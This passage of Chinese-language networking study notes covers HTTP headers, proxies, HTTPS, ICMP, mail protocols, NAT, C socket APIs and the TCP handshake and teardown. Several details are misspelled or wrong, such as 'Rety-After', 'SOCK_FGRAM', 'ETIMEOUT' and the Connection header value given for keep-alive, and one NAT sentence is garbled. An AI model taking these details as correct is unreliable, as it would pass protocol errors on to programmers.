<tr><td style="text-align: left">Proxy-Authorization</td><td style="text-align: left">代理服务器要求客户端的认证信息</td></tr>
<tr><td style="text-align: left">Range</td><td style="text-align: left">实体字节范围请求</td></tr>
<tr><td style="text-align: left">Referer</td><td style="text-align: left">对请求中的URL的原始获取方法</td></tr>
<tr><td style="text-align: left">TE</td><td style="text-align: left">传输编码的优先级</td></tr>
<tr><td style="text-align: left">User-Agent</td><td style="text-align: left">HTTP客户端程序的信息</td></tr>
</tbody></table>
</div>
<blockquote>
<p>响应首部字段</p>
</blockquote>
<div class="table-wrapper"><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody>
<tr><td>Accept-Ranges</td><td>是否接受字节范围请求</td></tr>
<tr><td>Age</td><td>推算资源创建经过时间</td></tr>
<tr><td>ETag</td><td>资源的匹配信息</td></tr>
<tr><td>Location</td><td>令客户端重定向至指定的URL</td></tr>
<tr><td>Proxy-Authenticate</td><td>代理服务器对客户端的认证信息</td></tr>
<tr><td>Rety-After</td><td>对再次发起请求的时机要求</td></tr>
<tr><td>Server</td><td>HTTP服务器的安装信息</td></tr>
<tr><td>Vary</td><td>代理服务器缓存的管理信息</td></tr>
<tr><td>WWW-Authenticate</td><td>服务器对客户端的认证信息</td></tr>
</tbody></table>
</div>
<h3 id="通信数据转发程序"><a class="header" href="#通信数据转发程序">通信数据转发程序</a></h3>
<h4 id="代理-proxy"><a class="header" href="#代理-proxy">代理 Proxy</a></h4>
<p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色。接收由客户端<em>发送的请求</em>并转发给服务器，同时接收服务器<em>返回的响应</em>给客户端。</p>
<p><img src="Basic/Networking/../images/1607603635756.png" alt="" />
使用代理服务器的理由有：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。</p>
<ul>
<li>缓存代理（Caching Proxy）：会预先将资源的副本保存在代理服务器上。</li>
<li>透明代理（Transparent Proxy）：在转发Request和Response时，不对报文进行任何加工的代理称为透明代理。反之称为非透明代理。</li>
</ul>
<h4 id="网关gateway"><a class="header" href="#网关gateway">网关：Gateway</a></h4>
<p><strong>网关是转发其它服务器通信数据的服务器</strong>。接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能不会察觉和自己通信的是一个网关。
网关能让通信线路上的服务器使用非HTTP协议服务，比如连接数据库。</p>
<h4 id="隧道"><a class="header" href="#隧道">隧道</a></h4>
<p>隧道：隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。</p>
<h2 id="cookies"><a class="header" href="#cookies">Cookies</a></h2>
<p>HTTP是一个stateless的协议。然而有时我们会希望保持连接的状态，要怎么办呢？</p>
<blockquote>
<p>什么是stateless: Stateless protocol does not require the server to retain session information or status about each communications partner for the duration of multiple requests. </p>
</blockquote>
<ul>
<li>使用IP Address记录，但是因为NAT的存在，这个方法会失效。</li>
<li>使用Cookies。</li>
</ul>
<h2 id="连接管理"><a class="header" href="#连接管理">连接管理</a></h2>
<p>我们知道HTTP建立在TCP连接上（HTTP3使用了QUIC，但还没有被广泛使用）。在早期，HTTP 使用一个简单的模型来处理这样的连接。这些连接的生命周期是短暂的：每发起一个请求时都会创建一个新的连接，并在收到应答时立即关闭。在 HTTP/1.x 里有多种模型：短连接，长连接，和HTTP 流水线。</p>
<ul>
<li>
<p>短连接：HTTP 最早期的模型，也是  HTTP/1.0 的默认模型，是短连接。每一个 HTTP 请求都由它自己独立的连接完成；这意味着发起每一个 HTTP 请求之前都会有一次 TCP 握手，而且是连续不断的。</p>
<p>在HTTP/1.0 中，如果没有指定 Connection 协议头，或者是值被设置为 close 会用这个模型。而在 HTTP/1.1 中，只有当 Connection 被设置为 close 时才会用到这个模型。</p>
</li>
<li>
<p>长连接：它会保持连接去完成多次连续的请求，减少了不断重新打开连接的时间。</p>
<p>HTTP/1.0 里默认并不使用长连接。把 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection"><code>Connection</code></a> 设置成 <code>close</code> 以外的其它参数都可以让其保持长连接，通常会设置为 <code>retry-after</code>。在 HTTP/1.1 里，默认就是长连接的，协议头都不用再去声明它(但我们还是会把它加上，万一某个时候因为某种原因要退回到 HTTP/1.0 呢)。</p>
</li>
<li>
<p>HTTP 流水线模型：它还要更先进一些，多个连续的请求甚至都不用等待立即返回就可以被发送。</p>
<p>但是因为TCP的性质，如果第一个返回阻塞了，那后面的返回也会被阻塞。</p>
</li>
</ul>
<p><img src="Basic/Networking/../images/HTTP1_x_Connections.png" alt="Compares the performance of the three HTTP/1.x connection models: short-lived connections, persistent connections, and HTTP pipelining." /></p>
<h2 id="caching"><a class="header" href="#caching">Caching</a></h2>
<p>HTTP头部的一些字段为我们缓存HTTP资源提供了支持</p>
<h2 id="https"><a class="header" href="#https">HTTPS</a></h2>
<p>因为HTTP不能确保消息传输的完整性，无法验证通信方的身份，使用明文进行通信。HTTP并不安全。所以我们引入了HTTPS，HTTP Secure。一般来说，就是在HTTP和TCP之间加入了SSL层，实现加密、证书、完整性验证的功能。
<img src="Basic/Networking/../images/1607664071115.png" alt="" /></p>
<h3 id="ssl"><a class="header" href="#ssl">SSL</a></h3>
<p><img src="Basic/Networking/../images/1607664077405.png" alt="" /></p>
<ol>
<li>可以确保服务器的公钥是真实的。</li>
<li>可以在不安全的通道上传输信息，因为私钥不需要传输。</li>
<li>使用<strong>非对称加密</strong>效率较低，可以在确保安全的情况下传输<strong>共享密钥</strong>实现<strong>对称加密</strong></li>
</ol>
<h2 id="认证-certification"><a class="header" href="#认证-certification">认证 Certification</a></h2>
<h3 id="基于ssl的certification"><a class="header" href="#基于ssl的certification">基于SSL的certification</a></h3>
<h3 id="基于表单的certification"><a class="header" href="#基于表单的certification">基于表单的certification</a></h3>
<p>这是最为常见的认证方式。目前没有标准的实现形式，一般结合Session和Cookie一起使用。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="internet-control-message-protocol"><a class="header" href="#internet-control-message-protocol">Internet Control Message Protocol</a></h1>
<p>ICMP一般是用来报告一些错误的发生的</p>
<div class="table-wrapper"><table><thead><tr><th>Property</th><th>Behavior</th></tr></thead><tbody>
<tr><td>Reporting Message</td><td>Self-contained message reporting error</td></tr>
<tr><td>Unreliable</td><td>Simple datagram service - no retries</td></tr>
</tbody></table>
</div>
<p>参考RFC792，我们可以知道ICMP规定的Message Types</p>
<div class="table-wrapper"><table><thead><tr><th>ICMP Type</th><th>ICMP Code</th><th>Description</th></tr></thead><tbody>
<tr><td>0</td><td>0</td><td>Echo Reply (used by ping)</td></tr>
<tr><td>3</td><td>0</td><td>Destination Network Unreachable</td></tr>
<tr><td>3</td><td>1</td><td>Destination Host Unreachable</td></tr>
<tr><td>3</td><td>3</td><td>Destination Port Unreachable</td></tr>
<tr><td>8</td><td>0</td><td>Echo Request (used by ping)</td></tr>
<tr><td>11</td><td>0</td><td>TTL Expired (used by traceroute)</td></tr>
</tbody></table>
</div>
<ul>
<li>
<p><code>ping</code>命令就是使用的ICMP。 当<code>A ping B</code>的时候，A向B发送<code>Echo Request</code>，然后B收到了的话向A回复<code>Echo reply</code>。</p>
</li>
<li>
<p><code>traceroute</code>命令也是使用的ICMP。通过一个巧妙的办法来实现</p>
<ol>
<li>首先设置IP header的TTL字段为1，这样在经过第一个route的时候，IP Packet就expired了，这时候会route就会返回<code>TTL Expired</code>给我们，，我们就获得了路径上第一个route的信息。</li>
<li>然后设置IP header的TTL字段为2，这样在经过第二个route的时候，IP Packet就expired了，这时候会route就会返回<code>TTL Expired</code>给我们，我们就获得了路径上第二个route的信息。</li>
<li>直到传递到destination B。我们发送的UDP包需要选择一个奇怪的Port，让B返回<code>Destination Port Unreachable</code>。这样就到达了终点。</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="邮件协议"><a class="header" href="#邮件协议">邮件协议</a></h1>
<h2 id="smtp"><a class="header" href="#smtp">SMTP</a></h2>
<p>SMTP是Internet电子邮件中最主要的应用层协议，<strong>邮件服务器之间</strong>邮件的传输都通过SMTP协议完成。他利用TCP提供的可靠传输，SMTP也是Client/Server模型，Client发文件Server收邮件，所以每个邮件服务器同时运行着Client和Server。Server监听端口号为25。</p>
<h3 id="结构-2"><a class="header" href="#结构-2">结构</a></h3>
<p><img src="Basic/Networking/../images/image-20211222223345013.png" alt="image-20211222223345013" /></p>
<h3 id="编码"><a class="header" href="#编码">编码</a></h3>
<p>由于SMTP悠久的历史，SMTP要求每个报文<strong>采用7 bit ASCII字符</strong>。那么如果我们需要传输类似中文、图片等非ASCII字符信息，我们就需要用ASCII字符对他们进行编码。</p>
<ul>
<li>
<p>Base64：</p>
<ul>
<li>
<p>先将24bit的代码划分为4个6位组。 </p>
</li>
<li>
<p>6bit组的二进制代码共有64种不同的值，从0到63。 用A表示0，B表示1，等等。26个大写字母排列完毕后，接下去再排26个小写字母，再后面是10个数字，最后用“+”表示62， 而用“/”表示63。再用两个连在一起的等号“==”和一个等号 “ =”分别表示最后一组的代码只有8或16比特。也就是</p>
<pre><code>A-00,B-01,C-02,D-03,E-04,F-05,G-06,H-07,I-08,J-09,
K-10,L-11,M12,N-13,O-14,P-15,Q-16,R-17,S-18,T-19,
U-20,V-21,W-22,X-23,Y24,Z-25, a-26,b-27,c-28,d-29,
e-30,f-31,g-32,h-33,i-34,j35,k-36,l-37,m-38,n-39,
o-40,p-41,q-42,r-43,s-44,t-45,u-46,v47,w-48,x-49,
y-50,z-51, 0-52,1-53,2-54,3-55,4-56,5-57,6- 58,7-59,
8-60,9-61,+-62,/-63
</code></pre>
</li>
<li>
<p>回车和换行都忽略，它们可在任何地方插入。</p>
</li>
</ul>
</li>
</ul>
<h1 id="邮件接收"><a class="header" href="#邮件接收">邮件接收</a></h1>
<p>SMTP是一个推协议。他适合<strong>Client主动将邮件发给Server</strong>，<strong>不适合Client向Server请求邮件</strong>。所以，对于请求邮件我们有POP3, IMAP, HTTP协议。</p>
<p><img src="Basic/Networking/../images/image-20211222223923067.png" alt="image-20211222223923067" /></p>
<ul>
<li>POP: Post Office Protocol [RFC 1939] (port 110) 
<ul>
<li>authorization (agent ↔ server) and download</li>
<li>Does not maintain state across POP sessions </li>
<li>Cannot manipulate emails at the server side </li>
</ul>
</li>
<li>IMAP: Internet Mail Access Protocol [RFC 3501] (port 143) 
<ul>
<li>more features (more complex) </li>
<li>manipulation of stored messages on server </li>
<li>Maintain state for the user </li>
</ul>
</li>
<li>HTTP: Hotmail , Yahoo! Mail, etc. 
<ul>
<li>像我们平时在浏览器上用的邮箱就是用HTTP，用HTTP进行<strong>收发</strong>。</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-address-translation"><a class="header" href="#network-address-translation">Network Address Translation</a></h1>
<p><a href="https://datatracker.ietf.org/doc/rfc1918/">RFC1918</a>规定了三个保留地址段落：10.0.0.0-10.255.255.255/8；172.16.0.0-172.31.255.255/12；192.168.0.0-192.168.255.255/16。这三个范围分别处于A,B,C类的地址段，不向特定的用户分配，被IANA作为私有地址保留。</p>
<p>对于有Internet访问需求而内部又使用私有地址的网络，就要在组织的出口位置部署NAT网关，在报文离开私网进入Internet时，<strong>将源IP替换为公网地址</strong>，通常是出口设备的接口地址。一个对外的访问请求在到达目标以后，表现为由本组织出口设备发起，因此被请求的服务端可将响应由Internet发回出口网关。出口网关再<strong>将目的地址替换为私网的源主机地址</strong>，发回内部。这样一次由私网主机向公网服务端的请求和响应就在通信两端均无感知的情况下完成了。依据这种模型，数量庞大的内网主机就不再需要公有IP地址了。这也就是**NAT（Network Address Translation，网络地址转换）**做的事情。</p>
<p>NAT缓解了IPV4地址不够用的问题，还可以隐藏私有网络，达到保护私有网络的目的。但是也带来很多问题：</p>
<ol>
<li>
<p>NAT 违反了IP的结构模型：结构模型声明每个 IP 地址均唯一标识了世界上的一台机器。 Internet的软件结构也是建立在这样的事实基础之上的。</p>
</li>
<li>
<p>NAT 打破了 Internet 的端·端的连接模型，即任何一个主机可在任何时间给任何一台其他主机发送数据包。因为 NAT 盒子上的映射是由出境数据包建立的，只能在出境数据包之后到达的入境数据包才能被接受。</p>
</li>
<li>
<p>NAT Internet 从一个无连接网络改变成一个面向连接网络特有的形式。问题在于 NAT 盒子必须为每一个从它这里经过的连接维护必要的信息（即映射关系）。让网络维护连接状态是面向连接网络的一种特性，而不是无连接网络的特性。如果 NAT 盒子崩溃，并且它的映射表丢失，那么它的所有 TCP 连接都将被摧毁。</p>
</li>
<li>
<p>NAT 违反了最基本的协议分层规则：第k层不应该对第k+1层在本层的有效载荷宇段中放什么作任何假设。这条基本原则可以保证层与层之间的独立性。</p>
</li>
<li>
<p>Internet 上的进程并不一定必须使用 TCP 或者 UDP 。如果机器 上的一个用户决定使用一种新的传输协议与机器 上的用户进行通话（比如，一个多媒体应用），那么，由于 NAT 的介入，这样的应用将无法工作，因为 NAT 盒子将无法正确地定位到 TCP Source port。</p>
</li>
<li>
<p>有些应用以规定的方式使用多个 TCP/IP 连接或者 UDP 端口。例如，标准的文件传输协议（FTP, File Transfer Protocol) 在数据包正文插入地址，接收方正文中提取出这些地址，并使用它们。所以FTP服务无法正常工作，当然也可以专门为此打个补丁。</p>
</li>
</ol>
<p>如果说一开始我们就能认识到32位的IP地址不够而使用IPv6就不用NAT这个打补丁的协议了，然而这就是现实，现实是受制于历史的发展进程的。另外，现在绝大多数的主机都处在内网内通过NAT协议访问Internet。</p>
<h2 id="nat的分类"><a class="header" href="#nat的分类">NAT的分类</a></h2>
<p><a href="https://www.rfc-editor.org/rfc/rfc3489.html#page-5">RFC3489</a>，NAT Variations。</p>
<ul>
<li>Full Cone NAT（一对一NAT）：把所有相同（internal IP address，port）的请求映射到相同的（external IP address，port）。因此，任何一个外部主机均可通过该映射发送数据包到该内部主机。</li>
<li>Restricted cone NAT：限制性锥NAT 把所有来自相同（internal IP address，port）的请求映射到相同的（external IP address，port）。但是, 和全锥NAT 不同的是：只有当内部主机先给外部主机（某IP地址）发送数据包, 该外部主机（该IP地址）才能向该内部主机发送数据包。</li>
<li>Port restricted NAT：端口限制性锥NAT 与限制性锥NAT 类似, 不过又多了端口号的限制, 即只有内部主机先向（某外部地址：某端口号）对发送数据包, （该外部主机：该端口号）才能使用特定的端口号向内部主机发送数据包。所以说，上面三种类型依次更加严格。</li>
<li>Symmetric NAT：对称型NAT把从相同（internal IP address，port）到相同（destination IP address，port）地址和端口的所有请求，都映射到同一个（external IP address，port）。并且这个映射只有在所以这也是也这是最严格的类型。</li>
</ul>
<h2 id="nat-tunnel"><a class="header" href="#nat-tunnel">NAT Tunnel</a></h2>
<p>NAT Tunnel，翻译做NAT打洞或者NAT穿透，简单地讲就是要让处于不同NAT网络下的两个节点(Peer)建立直接连接。换言之，双方要交换自己的<code>(外网IP,TCP src port')</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="p2p"><a class="header" href="#p2p">P2P</a></h1>
<p>应用层模型，有经典的Client/Server模型，有一个总是打开的Server，等待来自其他Client的请求。像Web，FTP都是这样的协议。而P2P模型中，任意一对计算机都是对等方，直接相互通信。</p>
<p><img src="Basic/Networking/../images/image-20211221231833544.png" alt="image-20211221231833544" /></p>
<p><strong>SSDP(Simple Sever Discovery Protocol 简单服务发现协议)</strong>。他是应用层协议，是构成通用即插即用(UPnP)技术的核心协议之一。</p>
<p>SSDP提供了在<strong>局域网内发现设备的机制</strong>。比如，家里有一个扫地机器人和我的手机都连着Wi-Fi，在同一个局域网。要怎么让手机发现扫地机器人呢？可以使用SSDP协议。</p>
<p>https://datatracker.ietf.org/doc/html/draft-cai-ssdp-v1-03</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="rtc"><a class="header" href="#rtc">RTC</a></h1>
<p>RTC在计算机领域其实有很多种意思，这里要讨论的是Real Time Communication，其他比较常见的还有Real Time Clock。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="socket-1"><a class="header" href="#socket-1">Socket</a></h1>
<ul>
<li>IPv4, IPv6 网络层</li>
<li>TCP/UDP/SCTP 传输层</li>
<li>ICMPv4/ICMPv6 网际消息控制</li>
<li>ARP/RARP 地址解析</li>
<li>BPF/DLPI 提供对链路层的访问能力</li>
</ul>
<h2 id="socket地址"><a class="header" href="#socket地址">Socket地址</a></h2>
<p>IPv4，定义在<code>&lt;netinet/in.h&gt;</code>. 宏展开之后是这样</p>
<pre><code class="language-c">/* Internet address.  */
typedef uint32_t in_addr_t;
struct in_addr
{
    in_addr_t s_addr;
};


struct sockaddr_in {
    sa_family_t     sin_family;  // AF_INET
    in_port_t       sin_port;    // 16 bits port number
    struct in_addr  sin_addr;    
    char            sin_zero[8]; // unused
}
</code></pre>
<p>IPv6</p>
<pre><code class="language-c">struct in6_addr
{
    union
    {
        uint8_t	__u6_addr8[16];
        uint16_t __u6_addr16[8];
        uint32_t __u6_addr32[4];
    } __in6_u;
};
struct sockaddr_in6
{
    sa_family_t sin6_family
    in_port_t sin6_port;	/* Transport layer port # */
    uint32_t sin6_flowinfo;	/* IPv6 flow information */
    struct in6_addr sin6_addr;	/* IPv6 address */
    uint32_t sin6_scope_id;	/* IPv6 scope-id */
};
</code></pre>
<p>和UNIX网络编程介绍的不太一样，主要是没有第一个长度字段。但是那个字段也没有什么用处。我们传递一个套接字地址结构的时候，都是传递指针和长度的。</p>
<h2 id="端序"><a class="header" href="#端序">端序</a></h2>
<p>网络中的数据是以大端序传输的。我们的主机的端序不一定（我的是小端）。所以提供了转换函数。像上面提到的地址结构，里面存储的数据就是网络大端序，需要用函数转换之后再填进去，比如<code>serv.sin_port = htons(80);</code></p>
<pre><code class="language-c">// h: host n:network 
uint16_t htons();
uint32_t htonl();
uint16_t ntohs();
uint32_t ntohl();
</code></pre>
<h2 id="error-1"><a class="header" href="#error-1">error</a></h2>
<p>定义在<code>#include &lt;errno.h&gt;</code>中。</p>
<pre><code class="language-c">#define errno (*__errno_location ())
</code></pre>
<p>错误处理非常奇怪。比如<code>connect</code>函数，出错了会返回-1。<strong>而具体的出错原因保存在一个全局变量<code>errno</code>中</strong>。说他是全局变量并不合适，不过你可以这么用，我觉得这个说法可能有点过时，实际上他的实现是线程本地存储，也就是说线程安全。可以参考https://github.com/chenpengcong/blog/issues/5。</p>
<h2 id="socket接口"><a class="header" href="#socket接口">Socket接口</a></h2>
<h3 id="socket-2"><a class="header" href="#socket-2">socket</a></h3>
<p>socket函数被设计成如下形式，返回一个描述符，出错返回-1。</p>
<pre><code class="language-c">int socket(int __domain, int __type, int __protocol)
</code></pre>
<ul>
<li>
<p>domain: 表示使用的协议族，可以参考<a href="https://man7.org/linux/man-pages/man7/address_families.7.html">man page</a>的详细列表。主要的一般就是<code>AF_INET</code>表示IPv4和<code>AF_INET6</code>表示IPv6。</p>
</li>
<li>
<p>type: 指明了通信的语义，还可以通过OR运算表示其他的性质，这个还没看懂。</p>
<div class="table-wrapper"><table><thead><tr><th>type</th><th>说明</th></tr></thead><tbody>
<tr><td>SOCK_STREAM</td><td>有序的，可靠的，全双工的，基于连接的字节流 （TCP）</td></tr>
<tr><td>SOCK_FGRAM</td><td>无连接的，不可靠的，有最大长度的 （UDP）</td></tr>
<tr><td>SOCK_SEQPACKET</td><td>有序的，可靠的，全双工的，有最大长度的，有序分组套接字 （SCTP）</td></tr>
<tr><td>SOCK_RAW</td><td>原始，直接访问网络协议</td></tr>
<tr><td>SOCK_RDM</td><td>可靠的数据报但是不保证顺序</td></tr>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>OR</th><th>说明</th></tr></thead><tbody>
<tr><td>SOCK_NONBLOCK</td><td>Set the O_NONBLOCK file status flag on the open file description (see open(2)) referred to by the new file descriptor.  Using this flag saves extra calls to fcntl(2) to achieve the same result.</td></tr>
<tr><td>SOCK_CLOEXEC</td><td>Set the close-on-exec (FD_CLOEXEC) flag on the new file  descriptor.  See the description of the O_CLOEXEC flag in open(2) for reasons why this may be useful.</td></tr>
</tbody></table>
</div></li>
<li>
<p>protocol: 指明了使用的通信协议。通常一个protocal和type是对应的。比如<code>IPPROTO_TCP</code> ,<code>PPROTO_UDP</code> ,  <code>IPPROTO_COMP</code>。</p>
</li>
</ul>
<h3 id="connect"><a class="header" href="#connect">connect</a></h3>
<pre><code class="language-c">int connect(int __fd, const struct sockaddr *__addr, socklen_t __len)
</code></pre>
<p>TCP Client用connect函数来建立与TCP服务器的连接。也就是会进行“三次握手”的过程。结合状态机，这个函数有可能会发生什么事情呢？</p>
<ol>
<li>连接成功，返回0。</li>
<li>出错，返回-1。
<ol>
<li>服务器返回了RST，出现了错误。<code>errno = ECONNREFUSED</code>。</li>
<li>没有收到SYN响应，<code>errno = ETIMEOUT</code>。</li>
<li>客户发出的SYN在中间的某个路由器上引发了一个destination unreachable。这时也会根据相应的ICMP消息设置<code>errno</code>。</li>
</ol>
</li>
</ol>
<h2 id="tcp-编程"><a class="header" href="#tcp-编程">TCP 编程</a></h2>
<h3 id="hello-world"><a class="header" href="#hello-world">Hello world</a></h3>
<p><img src="Basic/Networking/../images/image-20210811195311403.png" alt="image-20210811195311403" /></p>
<h3 id="编程模型"><a class="header" href="#编程模型">编程模型</a></h3>
<img src="Basic/Networking/../images/1628779426082.png" alt="af" style="zoom:67%;" /> 
<h3 id="tcp状态机"><a class="header" href="#tcp状态机">TCP状态机</a></h3>
<p><img src="Basic/Networking/../images/1612928882022.jpg" alt="状态机" /></p>
<p>RST报文段：一般来说，无论何时一个报文段发往基准的连接（指由目的IP地址和端口号以及源IP地址和端口号指明的连接）出现错误，TCP都会发出一个RST报文段。收到RST的一方将终止该连接，并通知应用层连接复位。比如：</p>
<ul>
<li>到不存在的端口的连接请求：服务器程序端口未打开而客户端来连接。比如主机1向主机2发送一个SYN请求，表示想要连接主机2的40000端口，但是主机2上根本没有打开40000这个端口，于是就向主机1发送了一个RST。</li>
<li>异常终止一个连接：终止一个连接的正常方式是一方发送FIN。有事这也称为有序释放，因为所有排队数据都已发送之后才发送FIN，正常情况下没有任何数据丢失。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tcp"><a class="header" href="#tcp">TCP</a></h1>
<p>TCP的一些特征（提供<strong>可靠有序的字节流</strong>通信）</p>
<div class="table-wrapper"><table><thead><tr><th>Property</th><th>Behavior</th></tr></thead><tbody>
<tr><td>Stream of bytes</td><td>Reliable byte delivery service</td></tr>
<tr><td>Reliable delivery</td><td>1.Ack indicate correct delivery<br />2. Checksum detect corrupted data<br />3. Sequence numbers detect missing data<br />4. Flow-control prevents overrunning receiver</td></tr>
<tr><td>In-sequence</td><td>Data delivered to application in sequence transmitted</td></tr>
<tr><td>Congestion Control</td><td>Control network congestion</td></tr>
</tbody></table>
</div>
<p>默认的 TCP Maximum Segment Size(MSS)大小是 536（不包括头部）。当一个主机想要把 MSS 设置到一个非默认的值时，MSS 大小会以一个 TCP 可选项的方式在握手时的 SYN 包中定义。由于最大分段大小被一个 TCP 参数控制，主机可以在接下来的任意分段中改变它。原因可以参考这个<a href="http://www.tcpipguide.com/free/t_TCPMaximumSegmentSizeMSSandRelationshiptoIPDatagra-2.htm">链接</a>，简单的说，为了提高传输效率要尽可能的大，但是太大了IP层会进行分片降低传输效率增加丢包几率，所以我们根据IP的最小MTU是576 bytes,，减去IP header 20 bytes，减去TCP header 20bytes得到了536 bytes。</p>
<h2 id="finite-state-machines"><a class="header" href="#finite-state-machines">Finite State Machines</a></h2>
<p>FSM在网络领域是描述一个协议的常用手段。比如TCP协议的FSM如下。红色是客户端的状态转移，蓝色是服务器的状态转移。看不懂没关系，可以先看下面的三次挥手和四次握手。</p>
<p><img src="Basic/Networking/../images/1612928882022.jpg" alt="状态机" /></p>
<h2 id="tcp-header"><a class="header" href="#tcp-header">TCP header</a></h2>
<p><img src="Basic/Networking/../images/TCP-Header-Format.png" alt="TCP Header | TCP Header Format | TCP Flags | Gate Vidyalay" /></p>
<ul>
<li>Source Port和Destination Port: 源端口和目的端口。</li>
<li>Sequence number: 因为TCP把数据看成是无结构的有序的字节流，所以Seq表示的是该报文段首字节的字节流编号。</li>
<li>Acknowledge Number: 希望收到的<strong>下一字节的序号</strong>。所以可以看出TCP采用的是<strong>累积确认</strong>的方式（希望收到x+1,表示x及之前的字节都被收到了）。不过如果收到了x+N的包怎么办？这个其实是未定义的，比不过在实践中多半会缓存下来。</li>
<li>Data Offset: 首部长度，或者说TCP报文的数据部分的开始地址，单位是4字节。所以一般情况下该字段为5(0b0101)，在有Optional字段的时候不是5，最大长度是60字节。</li>
<li>Reserved: 保留，做0 。</li>
<li>Flags
<ul>
<li>URG: 当URG=1，表示紧急指针字段有效。应该尽快传送紧急数据。</li>
<li>ACK: 确认号是否有效。在连接简历后所有传送的报文ACK都必须为1。</li>
<li>PSH</li>
<li>RST: 当RST=1，表示TCP连接中出现严重差错，必须释放连接。</li>
<li>SYN: 当SYN=1而ACK=0时，表示这时一个连接请求报文。对方如果同意建立连接，则应该在响应的报文段中使用SYN=1和ACK=1。</li>
<li>FIN: 当FIN=1，表明此报文段发送方的数据已经发送完毕，要求释放运输连接。</li>
</ul>
</li>
<li>Window: 接收窗口大小，详见<a href="Basic/Networking/./%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%92%8C%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6.html">拥塞控制</a>，让发送方根据此设置发送窗口。</li>
<li>Checksum：校验TCP Header和一部分IP Header（伪首部）的内容。</li>
<li>Urgent Pointer: 它和序号段的值相加表示最后一个紧急数据的下一字节的序号。</li>
</ul>
<h2 id="三次握手"><a class="header" href="#三次握手">三次握手</a></h2>
<p><img src="Basic/Networking/../images/1612676812466.jpg" alt="三次握手" /></p>
<p>为了建立连接TCP连接，通信双方必须从对方了解如下信息：</p>
<ol>
<li>对方报文发送的开始序号。</li>
<li>对方发送数据的缓冲区大小。</li>
<li>能被接收的最大报文段长度MSS。</li>
<li>被支持的TCP选项。</li>
</ol>
<ul>
<li>
<p>第一次握手：建立连接时，客户端发送SYN包到服务器，并进入SYN_SENT状态，等待服务器确认。</p>
<ul>
<li><code>SYN = 1</code>，表示请求建立连接。</li>
<li><code>seq = x</code>，作为客户端发送的初识序号。</li>
</ul>
</li>
<li>
<p>第二次握手：服务器收到SYN包，必须确认客户的SYN（Ack=j+1），同时自己也发送一个SYN包（seq=k），即SYN+ACK包，此时服务器进入SYN_RECV状态。  <strong>理论上，在这个时候，服务器要为该连接分配资源，但是这意味着SYN泛洪攻击可能发生。</strong></p>
<ul>
<li><code>SYN = 1</code>，表示同意建立连接。</li>
<li><code>seq = y</code>，作为服务器发送的初识序号。</li>
<li><code>ACK = 1</code>，表示收到用户发送的<code>SYN</code>包。实际上，之后发送的每一个包的ACK都为1。</li>
<li><code>ack = x+1</code>，表示请求的下一个字节是<code>x+1</code>（表示<code>x</code>之前的字节都已经收到）</li>
</ul>
</li>
<li>
<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(Ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p>
<ul>
<li><code>ACK = 1</code>，表示确认收到了服务器的SYN+ACK包。</li>
<li><code>ack = y+1</code>，表示请求的下一个字节是<code>y+1</code>（表示<code>y</code>之前的字节都已经收到）</li>
<li><code>seq = x+1</code>，此时可以开始携带数据了，开始的序号是<code>x+1</code>。</li>
</ul>
</li>
</ul>
<h2 id="四次挥手"><a class="header" href="#四次挥手">四次挥手</a></h2>
<img src="Basic/Networking/../images/1612676823930.jpg" style="zoom:50%;" />
<ol>
<li>客户端发送一个<code>FIN</code>包。此时客户端<strong>关闭自己的发送通道</strong>。
<ul>
<li><code>FIN = 1</code>，表示<strong>我不会再向你发送数据了</strong>。</li>
<li><code>seq = u</code>，<code>u</code>是连着上次发送的包的。不过FIN报文即使不携带数据，也消耗一个序号。<code>ACK = 1</code>，上面强调过，除了一开始的<code>SYN</code>包，其他的<code>ACK</code>都为1。这个和普通的包并没有什么不同。</li>
</ul>
</li>
<li>服务端发送一个<code>ACK</code>。表示确认收到了FIN包。
<ul>
<li><code>ACK = 1, ack = u+1</code>。</li>
</ul>
</li>
<li>服务器还可以接着发送数据，发送完成后，也发送<code>FIN</code>包表示我要关闭自己的发送通道了。
<ul>
<li><code>FIN = 1</code>，表示<strong>我不会再向你发送数据了</strong>。</li>
<li><code>ACK = 1, ack = u+1 seq =v</code> 。</li>
</ul>
</li>
<li>客户端确认。
<ul>
<li><code>ACK = 1, ack = v+1</code>，表示确认收到服务器发送的断开请求。此时客户进入TIME_WAIT状态。</li>
<li>为什么需要TIME_WAIT状态呢？一个是让旧连接的包在网络上消失，防止影响新连接（如果新的TCP四元组和老的一模一样）。一个是如果ACK丢了，服务器重传FIN可以响应（不过实际上是响应RST，不过作用差不多啦，都是把连接关掉）。</li>
</ul>
</li>
</ol>
<p>以上是理论的情况，实践中还有下面一些细节要注意</p>
<ol>
<li>**客户端直接把SOCKET的发送和接收都关了，比如调用close()方法，程序被kill都是这样。**这时发送的也是FIN包，没有信息会说我的接收状态。这时，如果服务器调用<code>send()</code>方法发送数据，那么客户端会返回一个<code>RST</code>。（如果想要控制双工通信的发送/接收的关闭，可以用<code>shutdown()</code>方法）</li>
